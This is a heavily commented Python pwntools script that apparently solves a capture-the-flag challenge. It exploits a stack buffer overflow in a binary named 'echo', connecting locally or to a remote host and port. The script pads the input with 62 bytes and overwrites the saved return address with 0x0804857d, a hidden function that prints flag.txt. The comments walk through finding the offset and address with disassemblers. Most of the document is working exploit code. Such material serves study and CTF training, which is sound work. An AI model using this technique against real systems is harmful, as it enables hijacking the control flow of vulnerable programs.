from pwn import *

# pwntools is great. Can set the context at the start
# and it will pack everything and even generate shellcode
# (not used here) that will work on that machine. No more
# worrying about endianess or 64 bit vs 32 bit or compiling
# custom shellcode.

# Installation of pwntools is a simple pip install pwntools
# Now for the fun stuff
context(arch = 'i386', os = 'linux')


# Should work even when they take servers down. There will
# need to be a local file called flag.txt . 
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
    l = listen(0)
    l.spawn_process(['./echo'])
    r = remote('localhost', l.lport)

# After looking in a disassembler,I  discovered there was a
# method that will open flag.txt and print it. Only issue
# is that the method isn't called during execution.
# Our goal is to change that.

# Using trial and error (and then later math in disassembler)
# I was able to calculate that the program was only allocating
# 58 bytes of space on the stack for the input entered by the
# user. Byte 58 - 62 would overwrite the ebp on the stack and
# then 62 - 66 would overwrite the stored return address of
#current method 'test'. Technically the "\n" is also written
# to the stack but it doesn't overflow anything important here.

overflow = "a"*62

# Address of method that opens and prints flag.txt. Can be
# found using the free version of Ida, gdb or I personally
# used Hopper. Radare2 also seems promising.
addr = 0x0804857d 

# Now let's construct the payload. Let's thank pwntools for
# making this easy
overflow += p32(addr)

# Send our exploit. Don't forget the newline..
r.send(overflow + "\n")
print "[*] Overflow sent."

# This is where I made a rookie mistake. The first thing
# returned is the result that includes echo. recv() only
# reads until it receives a newline.
r.recv() # garbage echo'd back to us

# Now get the flag, display it and feel accomplished.
flag = r.recv()
print "[*] Flag: " + flag
r.clean()
r.close()

# RyanAiden